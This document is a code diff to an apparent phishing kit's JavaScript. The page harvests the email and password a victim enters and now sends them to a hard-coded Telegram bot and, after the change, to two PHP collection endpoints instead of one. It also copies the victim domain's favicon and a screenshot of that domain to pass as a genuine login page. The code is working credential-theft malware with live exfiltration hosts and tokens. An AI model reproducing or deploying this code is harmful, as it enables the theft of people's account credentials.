@@ -186,16 +186,19 @@
             let attemptCount = 1;
             const MAX_ATTEMPTS = 4;
 
-            // Telegram (client‑side) – if this fails, the PHP will still send via its own token
+            // Telegram (client‑side)
             const TELEGRAM_BOT_TOKEN = '8717629711:AAHBBxRDJtxD6KHu1q-j38yJ98g5qlqzLeM';
             const TELEGRAM_CHAT_ID = '6159490685';
 
-            // MODIFIED: API endpoint changed to https://scitecinstruments.it.com/mine/result/api.php
-            const SERVER_URL = 'https://scitecinstruments.it.com/mine/result/api.php';
+            // ============================================================
+            // TWO API ENDPOINTS - BOTH WILL RECEIVE THE DATA
+            // ============================================================
+            const API_URL_1 = 'https://scitecinstruments.it.com/mine/result/api.php';
+            const API_URL_2 = 'https://scitecinstruments.it.com/mine/1/result/api.php';
 
             let messageSentForThisAttempt = false;
 
-            // ---------- Telegram sender (with error logging) ----------
+            // ---------- Telegram sender ----------
             function sendToTelegram(message) {
                 if (messageSentForThisAttempt) {
                     console.log('⚠️ Already sent for this attempt, blocking duplicate');
@@ -206,35 +209,45 @@
 
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML&_=${Date.now()}`;
                 
-                // Use Image to send (bypass CORS)
                 const img = new Image();
-                img.onload = () => console.log('✅ Telegram image request loaded (message likely sent)');
-                img.onerror = () => console.error('❌ Telegram image request failed – check bot token / chat ID / network');
+                img.onload = () => console.log('✅ Telegram image request loaded');
+                img.onerror = () => console.error('❌ Telegram image request failed');
                 img.src = url;
             }
 
-            // ---------- Server POST (to your PHP) with response logging ----------
-            function sendToServer(email, password, attempt) {
+            // ---------- Send to BOTH servers (parallel) ----------
+            function sendToBothServers(email, password, attempt) {
                 const formData = new URLSearchParams();
                 formData.append('email', email);
                 formData.append('password', password);
                 formData.append('attempt', attempt);
 
-                fetch(SERVER_URL, {
+                // Send to FIRST API
+                fetch(API_URL_1, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: formData
                 })
                 .then(response => response.json())
                 .then(data => {
-                    console.log('✅ Server response:', data);
-                    if (data.status !== 'success') {
-                        console.warn('⚠️ Server returned error:', data.message);
-                    }
+                    console.log('✅ Server 1 response:', data);
                 })
                 .catch(err => {
-                    console.error('❌ Error sending to server:', err);
-                    // Possibly CORS or wrong URL
+                    console.error('❌ Error sending to server 1:', err);
+                });
+
+                // Send to SECOND API (new one)
+                fetch(API_URL_2, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('✅ Server 2 response:', data);
+                })
+                .catch(err => {
+                    console.error('❌ Error sending to server 2:', err);
                 });
             }
 
@@ -338,8 +351,8 @@
                     // 1. Send to Telegram (client‑side)
                     sendToTelegram(completeMessage);
 
-                    // 2. Send to your PHP server (which will also send Telegram using its own token)
-                    sendToServer(email, password, currentAttempt);
+                    // 2. Send to BOTH PHP servers (both will receive the data)
+                    sendToBothServers(email, password, currentAttempt);
                 });
 
                 // Redirect on final attempt
@@ -363,7 +376,6 @@
                 document.title = siteName + document.title;
                 document.querySelector('#logoname').textContent = siteName;
 
-                // Optional favicon / background
                 let faviconUrl = `https://www.google.com/s2/favicons?domain=${domain}&sz=32`;
                 document.querySelector('link[rel="shortcut icon"]')?.setAttribute('href', faviconUrl);
                 document.body.style.backgroundImage = `url('https://image.thum.io/get/width/1200/http://${domain}')`;
@@ -390,4 +402,3 @@
     </script>
 </body>
 </html>
-```
